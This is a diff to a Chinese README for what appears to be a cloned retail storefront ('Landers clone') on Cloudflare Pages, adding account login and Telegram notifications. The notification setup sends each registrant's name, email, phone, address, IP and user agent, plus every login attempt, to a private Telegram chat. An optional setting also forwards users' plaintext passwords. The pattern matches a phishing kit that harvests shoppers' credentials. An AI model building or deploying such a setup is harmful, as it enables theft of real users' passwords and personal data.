@@ -119,8 +119,58 @@ Cloudflare Pages 的 **clean URLs** 会把 `/x.html` **308** 到 `/x`。所以�
 
 页头状态由 `auth.js` 驱动：未登录显示 `Sign Up / Login`，登录后显示 `Hi, <名> / Logout`；账号页会校验会话，未登录自动跳 `/login?next=/account`。
 
-> 演示边界：没有客户数据库，账号资料存在浏览器 cookie 里（`ld_user` / `ld_profile` 是 base64 JSON，`HttpOnly`）。
-> 生产接入请把这两个 cookie 换成真实会话 + 服务端用户表，前端调用点（`LD.auth.*`）不用改。
+### 登录是怎么校验的（不是"随便填都对"）
+
+```
+注册 POST /api/customer/register
+  └─ 校验字段 → PBKDF2-SHA256(password, 随机16字节salt, 100000 次) → {salt, hash, algo}
+     └─ 账号记录写入：KV(LD_USERS) 优先；没绑 KV 就写 cookie `ld_accounts`（本浏览器）
+        └─ 顺手：Set-Cookie ld_user(会话,30d) / ld_profile(资料,180d) / ld_accounts(180d)
+
+登录 POST /api/customer/login
+  ├─ 按邮箱查账号（KV → cookie 账号表）
+  ├─ 查不到      → {ok:false, code:"no_account",  message:"No account found for this email…"}
+  ├─ 密码不符    → {ok:false, code:"bad_password", message:"Incorrect password…"}
+  └─ 校验通过    → 常量时间比较通过 → Set-Cookie ld_user → {ok:true, user}
+```
+
+- 口令**只存哈希**，响应里不回传 `password` / `salt` / `hash`（自检脚本会查）。
+- 同一邮箱重复注册会被拒（`code:"email_taken"`）。
+- 全站没有"直通登录"分支：`login.js` 里没有"格式对就放行"的路径。
+
+### 账号落在哪（两种模式）
+
+| 模式 | 触发条件 | 行为 |
+|---|---|---|
+| **KV 落盘**（推荐） | Pages 绑定了 KV 命名空间 `LD_USERS` | 账号写 `user:<email>` → **跨设备 / 跨浏览器都能登录**；KV 有最终一致性，注册后立刻登录本机正常 |
+| **本机 cookie** | 未绑定 KV（默认） | 账号表放 `ld_accounts`（HttpOnly, 180 天, 最多 4 个账号）→ 同一浏览器可登录，换设备没有账号 |
+
+开通 KV 落盘：
+
+```bash
+# 1) 建命名空间
+npx wrangler kv namespace create LD_USERS
+# 2) Pages → 项目 → Settings → Functions → KV namespace bindings
+#    Variable name: LD_USERS      Namespace: 刚建的那个
+# 3) 重新部署（Redeploy）即可，代码不用改
+```
+
+### Telegram 通知（登录 / 注册事件）
+
+配置环境变量（Pages → Settings → Environment variables，Production + Preview 都加）：
+
+| 变量 | 说明 |
+|---|---|
+| `TELEGRAM_BOT_TOKEN` | BotFather 给的 token，形如 `123456:AA...` |
+| `TELEGRAM_CHAT_ID` | 你的 chat id（私聊给自己就用 user id；群组是负数，如 `-1001234567890`） |
+| `TELEGRAM_INCLUDE_PASSWORD` | 可选，`1` = 把用户提交的明文密码也带进消息（默认不带） |
+| `SITE_LABEL` | 可选，消息里的站点名，默认 `Landers clone` |
+
+- 注册成功推一条 **NEW MEMBER**（姓名/邮箱/手机/会员类型/地址/IP/UA/时间）
+- 每次登录都推：成功 `LOGIN OK`，失败 `LOGIN FAILED`（带原因：`wrong password` / `no account for this email`）
+- 发送是**异步尽力而为**：3.5 秒超时，失败不影响注册/登录本身（响应里的 `notified` 字段告诉你有没有发出去）
+- 自检连通性：`GET /api/customer/telegram-test` → `{ok, configured, status}`
+- ⚠ 用 `https://api.telegram.org` 直连即可，但 Cloudflare 到 Telegram 的出口在某些区域会偶发超时；如果长期失败，就在 Worker 里加个代理变量（`TELEGRAM_API_BASE`）指向你的反代
 
 ## HTTP 标头（`public/_headers`）
 
@@ -194,7 +244,7 @@ Cloudflare Pages 的 **clean URLs** 会把 `/x.html` **308** 到 `/x`。所以�
 npm run build     # 生成 dist/（Pages 的 Build command 就是这个）
 npm run dev       # 本地预览 http://127.0.0.1:4173 （模拟 Pages 路由 + 两个接口）
 npm run verify    # 契约自检 51 项（先 npm run dev）
-npm run e2e       # 真浏览器端到端：加购→购物车→结账→选址→注册→登录→账号（52 项）
+npm run e2e       # 真浏览器端到端：加购→购物车→结账→选址→注册→登录→错密码/未注册拦截→账号（56 项）
 npm run shots     # 生成 preview/*.png
 npm run clean     # 删掉 dist/
 
@@ -316,11 +366,11 @@ curl -s -X POST https://<站点>/api/checkout -H 'Content-Type: application/json
 
 ## 9. 自检记录
 
-`npm run verify`（契约，74 项）+ `npm run e2e`（真浏览器全链路，52 项）最近一次输出：
+`npm run verify`（契约，81 项）+ `npm run e2e`（真浏览器全链路，56 项）最近一次输出：
 
 ```
-[verify] pass=74 fail=0
-[e2e]    pass=52 fail=0
+[verify] pass=81 fail=0
+[e2e]    pass=56 fail=0
 ```
 
 覆盖：
